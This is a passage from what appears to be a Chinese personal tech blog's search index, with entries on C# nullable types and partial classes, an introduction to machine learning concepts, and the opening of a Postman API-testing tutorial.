class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 用??</span><br><span class="line">Func<string> f = () => GetName() ?? "test2";</span><br><span class="line">// 不用两个??，写条件表达式</span><br><span class="line">Func<string> f1 = () =></span><br><span class="line">{</span><br><span class="line">    var temp = GetName();</span><br><span class="line">    return temp != null ? GetName():"test2";</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实际上，??在复合情形中，更好用。</p><p>还有如何把第一个表达式，用?和??进行合并。</p><p><code>var flag = tt == null ? 1: tt.Name</code></p><h3 id="C-可空类型-Nullable"><a href="#C-可空类型-Nullable" class="headerlink" title="C# 可空类型(Nullable)"></a>C# 可空类型(Nullable)</h3><p>C#提供了一个特殊的数据类型， <strong>nullable</strong> 类型（可空类型）, 可空类型可以表示其基础值类型正常范围内的值，再加上一个 null 值。</p><p>例如，Nullable< Int32 >，读作”可空的 Int32”，可以被赋值为 -2,147,483,648 到 2,147,483,647 之间的任意值，也可以被赋值为 null 值。类似的，Nullable< bool > 变量可以被赋值为 true 或 false 或 null。</p><p>在处理数据库和其他包含可能未赋值的元素的数据类型时，将 null 赋值给数值类型或布尔型的功能特别有用。例如，数据库中的布尔型字段可以存储值 true 或 false，或者，该字段也可以未定义。</p><p>声明一个nullable类型（可空类型）的语法如下：</p><p><code><data_type> ? <variable_name> = null;</code></p><p>下面的示例展示可空数据类型的用法：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int? num1 = null;</span><br><span class="line">int? num2 = 45;</span><br><span class="line">double? num3 = new double?();</span><br><span class="line">double? num4 = 3.14157;</span><br><span class="line"></span><br><span class="line">bool? boolval = new bool?(); // 空的布尔值</span><br></pre></td></tr></tbody></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>基础学习参见<a href="https://www.runoob.com/csharp/csharp-regular-expressions.html" target="_blank" rel="noopener">菜鸟教程 正则表达式</a></p><h1 id="Partial-class说明"><a href="#Partial-class说明" class="headerlink" title="Partial class说明"></a>Partial class说明</h1><h2 id="partial-class基础"><a href="#partial-class基础" class="headerlink" title="partial class基础"></a>partial class基础</h2><p>C# 2.0就可以将类，结构或接口的定义分拆到两个或多个源文件中，在类声明前添加partial关键字即可。</p><p>例如：下面的PartialTest类</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class PartialTest</span><br><span class="line">{</span><br><span class="line">　　string Str_FieldTest; </span><br><span class="line">　　int Int_FieldTest; </span><br><span class="line">　　public void DoTest() </span><br><span class="line">　　{ </span><br><span class="line">　　　　Debug.Print("Test"); </span><br><span class="line">　　}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可在不同的源文件中拆写成下面形式：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">partial class PartialTest</span><br><span class="line">{</span><br><span class="line">    string Str_FieldTest;</span><br><span class="line">    int Int_FieldTest;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>另一个文件中写：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">partial class PartialTest</span><br><span class="line">{</span><br><span class="line">    public void DoTest()</span><br><span class="line">    {</span><br><span class="line">    Debug.Print("Test");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>什么情况下使用分部类</strong></li></ul><ol><li>处理大型项目时，使一个类分布于多个独立文件中可以让多位程序员同时对该类进行处理（相当于支持并行处理，很实用）；</li><li>使用自动生成的源时，无需重新创建源文件便可把代码添加到类中。可以观察到Visual Studio在创建Windows窗体，Web窗体都使用此方法。你不用编辑Visual Studio所创建的文件，便可创建使用这些类的代码。换句话说：系统会自动创建一个文件（一般记录的是窗体及窗体中的控件的属性），另一个或几个文件记录的是用户自己编写的代码。这两部分分开可以使结构显得非常清晰，用户只需关注自己负责的那部分就行了（需要的话，这两部分可以互相调用）。等到了编辑运行的时候，系统会自动将这两部分合成一个文件。</li></ol><ul><li><strong>使用Partial需要注意以下情况</strong></li></ul><ol><li>使用partial关键字表明可在命名空间内定义该类，结构或接口的其他部分；</li><li>所有部分都必须使用partial关键字；</li><li>各个部分必须具有相同的可访问性，如public，private等；</li><li>如果任意部分声明为抽象的，则整个类型都被视为抽象的；</li><li>如果将任意部分声明为密封的，则整个类型都被视为密封的；</li><li>如果任意部分声明继承基类时，则整个类型都将继承该类；</li><li>各个部分可以指定不同的基接口，最终类型将实现所有分部声明所列出的全部接口；</li><li>在某一分部定义中声明的任何类、结构或接口成员可供所有其他部分使用；</li><li>嵌套类型可以是分部的，即使它们所嵌套于的类型本身并不是分部的也如此。如下所示：</li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Container</span><br><span class="line">{</span><br><span class="line">    partial class Nested</span><br><span class="line">    {</span><br><span class="line">        void Test1();</span><br><span class="line">    }</span><br><span class="line">    partial class Nested</span><br><span class="line">    {</span><br><span class="line">        void Test2();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>使用分部类的一些限制</strong></li></ul><ol><li>要作为同一类型的各个部分的所有分部类型定义都必须使用partial 进行修饰。如下所示：</li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public partial class A { }</span><br><span class="line">public class A { } // Error, must also be marked partial</span><br></pre></td></tr></tbody></table></figure><ol><li>partial 修饰符只能出现在紧靠关键字class、struct 或interface前面的位置(枚举或其它类型都不能使用partial)；</li><li>要成为同一类型的各个部分的所有分部类型定义都必须在同一程序集和同一模块（.exe 或.dll 文件）中进行定义。分部定义不能跨越多个模块；</li><li>类名和泛型类型参数在所有的分部类型定义中都必须匹配。泛型类型可以是分部的。每个分部声明都必须以相同的顺序使用相同的参数名。</li></ol><h2 id="partial-class扩展功能新思路"><a href="#partial-class扩展功能新思路" class="headerlink" title="partial class扩展功能新思路"></a>partial class扩展功能新思路</h2><p>开闭原则：“对修改封闭，对扩展开放”。在面向对象的系统中，通过类的继承实现扩展。.net中提供的partial class提供了扩展类的新思路。</p><ul><li><strong>应用场景</strong></li></ul><p>可以使用partial class的场景很多。这里分析一个ORM的例子。</p><p>系统中有一个Cat类，属性ID、Age、Weight都需要存储到数据库中，一个信息系统中常见的需求。通过读取数据库的结构，可以用工具生成Cat类的代码。并且ORM框架支持了从数据库信息生成Cat对象。</p><p>现在的Cat什么动作都没有，客户说，我们需要一个Miaow()的函数。这时就需要对ORM生成的Cat类进行扩展了。</p><p>可以肯定地一点是，我们不能修改自动生成的代码，因为这会牵涉到数据库结构与代码同步的问题。解决这个需求有两种方法：继承方式扩展，partial class扩展。</p><ul><li><strong>继承方式扩展</strong></li></ul><p>工具自动生成一个CatBase类，这个类只有属性，嵌入到ORM框架中。既然需要扩展功能，很容易想到对这个基类继承，于是有了Cat类。Cat类如愿以偿地有了Miaow()函数。</p><p>以前系统中用的是CatBase的实例，现在创建CatBase实例的地方需要改为创建Cat的实例。这个问题让ORM框架解决吧。</p><p>客户的需求实现了，我们自己的代码生成也没有遭到破坏，任务完成。</p><ul><li><strong>partial class扩展</strong></li></ul><p>partial class简单地说就是可以将一个类的代码写到两个或多个代码文件中。编译器在编译的过程中将这几个文件组合起来一起编译。一个很酷的技术。</p><p>工具生成的Cat类仍然不变。既然需要增加函数，那么在新建一个代码文件，将Miaow()函数写出来就可以。需要做的仅仅是将类的声明由class改为partial class，任务完成。</p><ul><li><strong>对比分析</strong></li></ul><p>两种思路都可以实现需求。孰优孰劣需要仔细分析一下。</p><p>实例创建：partial class更加简洁。</p><p>系统复杂度：对于系统来说，partial class方式下只存在一个类，而继承方式有两个类。</p><p>继承逻辑：从逻辑上讲，Cat并不需要一个基类CatBase，这样做仅仅是因为在代码构建过程中的一个限制。</p><p>维护性：两种方式下都会存在两个代码文件，维护成本并没有区别。</p><p>可读性：两个Cat文件确实让人费解。</p><p>整体上说，使用partial class方式的代码编写会更优雅一些。</p><p>“继承”的这种方式比较符合传统的思维习惯，而partial class到底是不是满足开闭原则呢，这点确实不好说。不过在软件构建上，我是一个实用主义者，哪种方式好用就用哪一种。</p><p>在ORM的场景中，partial class更加好一些，但有的时候，两个类之间确实就存在继承关系，那么就必须用到继承了。虽然绝大多数情况下，都需要继承方式，但是既然有了partial class技术，我们在做设计时也需要考虑这个思路。</p><p>可以看到在VS，Form，Dataset中都使用了partial class方式，原理和这个一样。但是要将这个原理推广到“业务实体”中，可能在理解上需要有所突破。</p><p>使用partial class确实会带来可读性的损失，尤其是一个类分布在很多个文件中的时候，所以文件的命名最好是有一个规范来保证。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li>C#与.net3.5高级程序设计(第4版)</li><li><a href="https://blog.csdn.net/playermaker57/article/details/79443627" target="_blank" rel="noopener">C# 6.0语法 可空表达式 ?</a></li><li><a href="https://www.cnblogs.com/qtiger/p/11177036.html" target="_blank" rel="noopener">C# 基础知识之Partial</a></li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识机器学习</title>
      <link href="/2019/08/17/%E5%88%9D%E8%AF%86%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/08/17/%E5%88%9D%E8%AF%86%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h3><h4 id="什么是机器学习？"><a href="#什么是机器学习？" class="headerlink" title="什么是机器学习？"></a>什么是机器学习？</h4><p>机器学习指的是<strong>计算机</strong>对历史数据进行统计分析，找出规律，建立模型，最关键的是可以对未来<strong>不确定性</strong>场景进行判断和决策。</p><p>具体可见，<a href="https://www.jianshu.com/p/ac6b163dc3be" target="_blank" rel="noopener">什么是机器学习</a>。</p><p>那什么是不确定性的场景呢？比如说太阳明天从什么地方升起，这就是确定的场景，因为永远都是从东方升起，从西方落下。但是下个季度的能完成多少业绩，这就是不确定的。</p><p>理解机器学习需要注意以下几个要点：</p><ul><li><p>对历史数据的分析的主体是<strong>机器</strong>而不是人，这就与数据分析区别开了。</p><p>数据分析因为主体是人，所以能分析出什么很大程度取决于人的水平。而机器学习其实就是想撇开人的因素，完全使用机器来挖掘数据</p></li><li><p>需要大量的原材料，也就是<strong>数据</strong></p><p>只有数据多了，能找出来的规律就越精准</p></li><li><p>找出了规律如何落地：</p><p>从数据中挖掘出来的规律，其实就是一个<strong>函数</strong>，我们可以把输入代进去，就可以得到输出。那机器挖掘出这个规律以后，会直接由机器生成代码。</p><p><img src="https://i.loli.net/2019/08/17/5hVfqtoXRwju2m8.jpg" alt="1323506-2ca6beacdbf0b323.webp.jpg"></p></li></ul><h4 id="从数据中寻找规律"><a href="#从数据中寻找规律" class="headerlink" title="从数据中寻找规律"></a>从数据中寻找规律</h4><p><em>全量数据分析</em></p><p>人们从数据中寻找规律的历史已经非常长了，还建立了<strong>概率论和统计学</strong>两门学科。</p><p>在过去很长一段时间里面，因为受限于人类的计算能力，我们对数据一般会先<strong>采样</strong>，建立模型。但是因为是采样的，一定有样本的损失，所以一般来说会回过头去验证这个模型是否靠谱。</p><p>那我们来总结一下整个流程：</p><p><code>抽样——>描述统计——>结论——>假设检验</code></p><p>不过现在因为计算能力得到很大的提升，我们完全可以对<strong>全量</strong>的数据进行分析了。</p><h4 id="从可视化到函数"><a href="#从可视化到函数" class="headerlink" title="从可视化到函数"></a>从可视化到函数</h4><p>假设我们现在想分析美国某个地区的气温的情况，最直观的方法是把历史数据画一个图，可视化展示，这样就可以直观的了解其规律。</p><p><img src="https://i.loli.net/2019/08/17/YoEybdUZVMr7tKq.jpg" alt="1323506-3e109a090cb555dd.webp.jpg"></p><p>比如从上图这个<strong>散点图</strong>里面，我们可以发现如下规律：</p><ul><li>这些年的气温总体是<strong>上升</strong>的</li><li>局部是上下波动的。</li></ul><p>这种方法最大的好处是直观，缺点是没办法进行计算，所以我们需要进行量化。</p><p>那怎么使用模型来拟合规律呢？</p><p>我们可以使用<strong>函数</strong>来拟合，然后通过函数画一条函数曲线。</p><p>我们希望这个函数曲线可以尽量的与之前的散点图<strong>拟合</strong>在一起。</p><h4 id="机器学习发展的源动力"><a href="#机器学习发展的源动力" class="headerlink" title="机器学习发展的源动力"></a>机器学习发展的源动力</h4><p>机器学习在这几年得到蓬勃发展，其主要动力是：</p><ul><li>从历史数据中找出规律，可以辅助未来决策。</li><li>用数据代替专家</li><li>数据变现</li></ul><h4 id="业务系统发展的历史"><a href="#业务系统发展的历史" class="headerlink" title="业务系统发展的历史"></a>业务系统发展的历史</h4><p>最开始的时候基本上是靠人拍脑袋决定业务的方向，后面引入了数据的因素，也就是让一批懂数据分析的人，按照不同的维度整理报表，同样人的因素在里面依然重要。结论准确不准确，依靠的是这个人的经验如何。</p><p>而第三个阶段就是机器学习，可以分为离线以及在线学习。</p><ul><li>离线学习：利用空余时间训练模型，然后把模型应用到原来的系统中。</li><li>在线学习：来一条数据就可以加入原有的模型中，也就是模型是实时更新的。主要还是电商、搜索等行业需求比较多。</li></ul><p>在线学习和离线学习在算法层面其实没有什么差异。</p><h3 id="生活中的机器学习"><a href="#生活中的机器学习" class="headerlink" title="生活中的机器学习"></a>生活中的机器学习</h3><h4 id="关联规则"><a href="#关联规则" class="headerlink" title="关联规则"></a>关联规则</h4><p>最典型的案例是啤酒和尿布，具体的可见什么是机器学习</p><p>这个算法也就有了个新的名称，叫“购物篮算法”</p><h4 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h4><p>使用聚类可以解决用户细分精准营销的问题。聚类算法可以把一堆消费的数据进行分析，将用户分为若干类。再由业务人员去看哪一类的人员有什么样的消费特征。</p><h4 id="朴素贝叶斯和决策树"><a href="#朴素贝叶斯和决策树" class="headerlink" title="朴素贝叶斯和决策树"></a>朴素贝叶斯和决策树</h4><p>朴素贝叶斯的典型应用是<strong>垃圾邮件</strong>识别。</p><p>贝叶斯就是通过一些公式计算事件A对事件B的发生概率的影响，所以垃圾邮件识别就是通过邮件的一些特征，比如一些关键词、发件人等来判断该邮件是垃圾邮件的概率。</p><p>决策树主要用在<strong>防信用卡欺诈</strong>上，主要是银行用来进行信贷的风险识别，以决定是否放贷给你，它可以识别你是否有能力偿还贷款，另一方面还可以判断你是否是恶意骗贷。</p><h4 id="ctr预估和协同过滤"><a href="#ctr预估和协同过滤" class="headerlink" title="ctr预估和协同过滤"></a>ctr预估和协同过滤</h4><p>ctr预估主要用于搜索引擎的互联网广告，对于每条链接，百度都会对它进行<strong>点击率</strong>进行评估，然后把预测出来的最可能点击的链接放到第一位。里面使用的算法就叫“线性的逻辑回归”。</p><p><img src="https://i.loli.net/2019/08/17/h3sHmjkotg7AW5E.jpg" alt="1323506-1a3ddc66a0e1c705.webp.jpg"></p><p>协同过滤主要用在<strong>推荐系统</strong>里面。其实就非常类似于之前讲过的购物车分析，只是可能的算法不一样，但是要解决的问题都一样。</p><h4 id="自然语言处理和图像识别"><a href="#自然语言处理和图像识别" class="headerlink" title="自然语言处理和图像识别"></a>自然语言处理和图像识别</h4><p>自然语言处理又是机器学习的另一个领域了，可以进行</p><ul><li>情感分析</li><li>实体识别：可以把人名、地名等识别出来</li></ul><p>深度学习目前主要用于图像识别，可以对图片进行深度学习 ，识别图片中人物的特征。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/DRcBROv*6J6Z1p4XUwHv0CAuGX7vs01BSxhjAbYgDME!/b/dL4AAAAAAAAA&bo=zgIHAgAAAAARB*k!&rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/xr1WIRLCI*GBArHPYeaLYgRcuEkKcgeQfK57JOZPHw8!/b/dFABAAAAAAAA&bo=PQJ5AQAAAAARB3c!&rf=viewer_4" alt></p><h3 id="数据分析和机器学习的区别"><a href="#数据分析和机器学习的区别" class="headerlink" title="数据分析和机器学习的区别"></a>数据分析和机器学习的区别</h3><p>本章主要介绍数据分析与机器学习之间的区别在哪里。</p><ul><li>首先他们分析的数据不同，<ul><li>数据分析主要处理的是交易数据，而机器学习主要分析的是行为数据，比如搜索历史、点击历史、评论等。</li><li>从这两类数据就衍生出数据量的不同，交易数据明显就是少量的数据，而用户的行为数据就是海量的数据。</li><li>对两种数据分析方法也是不一样的</li></ul></li></ul><p>对交易数据一致性要求非常高，而行为数据一致性要求并不高。所以行为数据一般使用NoSQL来处理。NoSQL数据库只能用来处理行为数据，因为它的底层架构就是分布式的，而且强调CAP的概念，也就是在保证数据吞吐量的前提下，会对一致性大大折扣。</p><p>所以对于交易数据而言，我们通常可以采用采样分析的方法。对行为数据，我们一般采用全量分析，这也是我们强调Hadoop等海量数据分析平台的原因</p><ul><li>他们要回答的问题也是不一样的。</li></ul><p>传统的数据分析，其实是想要报告历史上发生了的事情的。比如过年3年内，哪些是我们的优质客户，业绩如何等等。</p><p>而机器学习更重要的是预测未来会发生什么事情，这就是二者最本质的区别。</p><ul><li>采用的技术手段不同。</li></ul><p>数据分析主要是靠人的经验来进行分析建模，利用OLAP联机的分析工具。分析的能力受限于分析师本人。也限制了我们数据处理的维度以及属性。</p><p>而机器学习主要靠算法驱动，可以维度可以相当大。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/0n3d*bugScOBcLqghHs4QIqUr6OGursoE9Vz7etm46E!/b/dMMAAAAAAAAA&bo=2wIMAgAAAAARF*c!&rf=viewer_4" alt></p><p>实际上，部分算法已经很成熟了，比如推荐系统算法等。</p><ul><li><p>参与者不同。</p><p>数据分析主要靠分析师的能力。</p></li></ul><p>而机器学习靠算法来驱动，主要靠数据质量来决定结果，而算法的区别其实没有那么悬殊。</p><ul><li>服务的对象不同。</li></ul><p>数据分析主要面向的还是高层，为他们提供决策驾驶舱。机器学习更多的是面向个人。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/xrr9KeHA2.Sq6HCjQxnmO9Oi6WYSNz1TgSTo17Iy27M!/b/dLYAAAAAAAAA&bo=WwKPAQAAAAARF*c!&rf=viewer_4" alt></p><h3 id="常用算法"><a href="#常用算法" class="headerlink" title="常用算法"></a>常用算法</h3><h4 id="分类别"><a href="#分类别" class="headerlink" title="分类别"></a>分类别</h4><p>机器学习的算法相当之多，我们可以进行简单的分类，而且分类的方法也多种多样，</p><p>按学习方法分类别，我们可以把算法分为：</p><ul><li>有监督学习：</li></ul><p>对分类数据提前打好了标签，然后对一堆数据进行训练。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/LwpGMNnbv1ahr2JT5iLpbnPvKt600XciMLSLtACwgDU!/b/dMMAAAAAAAAA&bo=ywFHAQAAAAARF6w!&rf=viewer_4" alt></p><p>典型的有监督学习算法是分类算法和回归算法，<strong>这两者明确给出了最终的目的是什么。</strong>比如分类算法给出了Y，也就是明确了最终可以区分出那些是垃圾，那些是正常邮件。</p><ul><li>无监督学习</li></ul><p>就是我们最终要分的类别其实我们事先是不知道的。最典型的就是聚类。只能让算法自己的推测出Y是什么。</p><ul><li>半监督学习：也叫强化算法。</li></ul><p>有目的，但是可能不准确，然后一步一步的修正。</p><p>第二种分类的方法是根据我们要解决的问题来进行分类。</p><ul><li>分类与回归：根据问题来进行分类。</li><li>聚类</li><li>标注：给一段文本，对里面的词语打上标签。</li></ul><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/UTDrEq.qu7qWP12vm38ChKXWNmZGNuRA.hJw7jxbq9U!/b/dLYAAAAAAAAA&bo=ugF1AAAAAAARF.4!&rf=viewer_4" alt></p><p>第三种分类是生成模型和判别模型，这种分类算法直指<strong>算法本质</strong>。</p><ul><li>生成模型：它不会告诉你属于哪一类，只是告诉你属于哪一类的概率。</li><li>判别模型：相当于有个函数，给一个输入，就可以告诉这个数据属于哪个一类别，直指最后的目的。</li></ul><p>所以他们回答问题的方式是不一样的。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/ElHPhx8bHFQQOzYaElB1craJo8g84gX9Vp.aW8vVHbw!/b/dLgAAAAAAAAA&bo=UgJ4AQAAAAARFwk!&rf=viewer_4" alt></p><h4 id="机器学习常见的算法"><a href="#机器学习常见的算法" class="headerlink" title="机器学习常见的算法"></a>机器学习常见的算法</h4><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/mYFrKWrmhequW8QPWkVjx8mGRe8qGGVgSXVBHPjTpCw!/b/dMMAAAAAAAAA&bo=6AOzAQAAAAARF3k!&rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/U*m3TM8xA8u2xhSsDaHG7gPPmBfINz3l7UyA.NGyaKQ!/b/dLgAAAAAAAAA&bo=bANcAQAAAAARFxI!&rf=viewer_4" alt></p><h3 id="机器学习解决问题的流程"><a href="#机器学习解决问题的流程" class="headerlink" title="机器学习解决问题的流程"></a>机器学习解决问题的流程</h3><p>机器学习要解决的问题相对而言还是比较单纯的<strong>，一个是预测的问题，一个是聚类的问题。</strong></p><p>而预测问题无非就是要预测所属的分类要么就是预测数值，本质上就是要预测的Y是个连续型的变量还是一个离散型的变量。</p><p>所以机器学习要解决的问题是比较单纯的。</p><p>为什么会出现了这么多算法呢？他们有没有相似性。</p><p>下面我们可以介绍一下机器学习总的框架，介绍一下算法的通用的思想和指导的原则。</p><p>下面我们来看机器学习是怎么样解决问题的。</p><h4 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h4><p>做机器学习之前我们肯定需要先确认业务目标的，看看<strong>业务层面</strong>要解决什么问题。然后</p><ul><li><p>分析业务上有什么样的需求</p></li><li><p>搜集历史数据：数据搜集得越多，则模型构建得更精确。</p></li><li><p>接着就是做很重要的一步就是<strong>数据的预处理</strong>，做整合，提取一些<strong>特征</strong>。</p><p>比如说滴滴打车可能与天气有关，所以天气的数据可能就非常重要，我们可以把它们单独提取出来。</p></li></ul><p>从纯算法来提升性能其实很有限，而数据的质量决定了最后的效果，所以数据的<strong>特征工程</strong>最重要，难点也在如何构建特征工程上。</p><h4 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h4><p><strong>定义模型——>定义损失函数——>优化算法</strong></p><p>接下来就是构建模型。</p><ul><li>首先我们要定义一个模型，其实就一个函数，只是有些参数我们不知道。这个模型是根据我们要解决的问题来定义的。</li></ul><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/qzptXd8Eku6LGisaHEoyhii6VlbvAq4zynUsK6Xr7qY!/b/dD4BAAAAAAAA&bo=vAFPAAAAAAARB8I!&rf=viewer_4" alt></p><ul><li><p>然后定义<strong>损失函数</strong>:做机器学习，其实就是要做预测，既然是预测，所以一定是与真实情况有偏差的。损失函数就是定义一个偏差的大小，就是一个标准。评价的标准，相似程度有多大。评估这个模型好不好。</p><p>回归问题的损失函数比较容易定义，因为回归就是找一个恰当的模型，我们把真实的情况减去使用这个模型得到的值就可以获得到损失函数</p><p>但是分类问题就比较难做了。</p></li><li><p>优化算法：</p><p>让损失函数取最小值的。也就是让函数求最小值。</p></li></ul><p>英文：</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/USXCFOxw7dojn4B05S*sOZW0GTnN6ey9FzCwudCZyrw!/b/dLgAAAAAAAAA&bo=GQK2AQAAAAADB44!&rf=viewer_4" alt></p><p>中文：</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/wgFBOMFmMP136ZgsaL3P68FU0ZY4stNEcgEVIL25lxk!/b/dL4AAAAAAAAA&bo=5QGWAQAAAAARF1M!&rf=viewer_4" alt></p><h4 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h4><p>我们是从历史的数据中得到的模型，需要进行验证，</p><ul><li>交叉验证</li><li>效果评估</li></ul><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/3AfRyyz7xt3o1IM4pV*Yuywujh0DpfsnRb4ofS5WpvA!/b/dL4AAAAAAAAA&bo=fQKYAQAAAAARF8Y!&rf=viewer_4" alt></p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><strong>图片按照色彩聚类</strong></p><p>待续…</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1] <a href="https://www.jianshu.com/p/ac6b163dc3be" target="_blank" rel="noopener">什么是机器学习</a></p><p>[2] <a href="https://www.imooc.com/learn/717" target="_blank" rel="noopener">初识机器学习-理论篇</a></p><p>[3] <a href="https://www.jianshu.com/p/7f9ba831d055" target="_blank" rel="noopener">初识机器学习</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> Machine  Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Postman使用教程</title>
      <link href="/2019/08/17/Postman%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/08/17/Postman%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="PostMan使用教程-一"><a href="#PostMan使用教程-一" class="headerlink" title="PostMan使用教程(一)"></a>PostMan使用教程(一)</h1><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p><strong>1.进入postpostman官网 <a href="https://www.getpostman.com/apps" target="_blank" rel="noopener">https://www.getpostman.com/apps</a> ，自行下载安装，我这里下载使用的是Windows版。</strong></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/OnvaEV53McFRxaih78KLqEk0P*eFtu1.ck2W9nfstiw!/b/dL4AAAAAAAAA&bo=OASpAwAAAAADB7Q!&rf=viewer_4" alt></p><p><strong>2.安装完成后，点击图标启动Postman。</strong></p><p><strong>3.根据界面提示注册一个账户，已有账户的的同学请进行登陆操作。不妨采用邮箱注册。</strong></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/tkPPlU8WCelQxt9KLDPJsVcv0NdzKf9Ob89e1W9cjp8!/b/dL4AAAAAAAAA&bo=zgNcBAAAAAADB7c!&rf=viewer_4" alt></p><p><strong>4.登陆成功后，创建测试集合，用来管理测试用例，并输入测试集名称。</strong><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/IpfOg05IDsNxQVgE1h5pVK4QwxY6HNMUtyoXLbobbA8!/b/dLgAAAAAAAAA&bo=OASgAgAAAAADB7w!&rf=view5r_4" alt></p><p><strong>5.根据接口测试文档输入Request以下参数信息</strong></p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/7XwYBrhQSMmpsSvTfcHhIy2jD3v2qtlOl.g4Jh9i0GE!/b/dFQBAAAAAAAA&bo=OAS.AQAAAAADB6E!&rf=viewer_4" alt></p><h2 id="认识Postman"><a href="#认识Postman" class="headerlink" title="认识Postman"></a>认识Postman</h2><p><strong>1.Postman背景介绍</strong></p><p>​    用户在开发或者调试网络程序或者是网页B/S模式的程序的时候是需要一些方法来跟踪网页请求的，Postman这款网页调试工具不仅可以调试简单的css、html、脚本等简单的网页基本信息，它还可以发送几乎所有类型的HTTP请求！Postman在发送网络HTTP请求方面可以说是Chrome插件类产品中的代表产品之一。</p><p><strong>2.Postman基础功能</strong></p><p><img src="https://img-blog.csdn.net/20180523232921542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z4YmluMTIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt></p><p><strong>3.接口请求流程</strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.GET请求</span><br><span class="line">(1)GET请求：点击Params，输入参数及value，可输入多个，即时显示在URL链接上。所以，GET请求的请求头与请求参数如在接口文档中无特别声明时，可以不填。</span><br><span class="line">(2)响应示例：有请求的响应状态码，响应时间，以及响应大小</span><br><span class="line">(3)响应体示例：响应的格式可以有多种，一般情况下，我们自定义接口的话是json格式的响应体。</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2. POST请求</span><br><span class="line">POST请求一：表单提交</span><br></pre></td></tr></tbody></table></figure><p>​    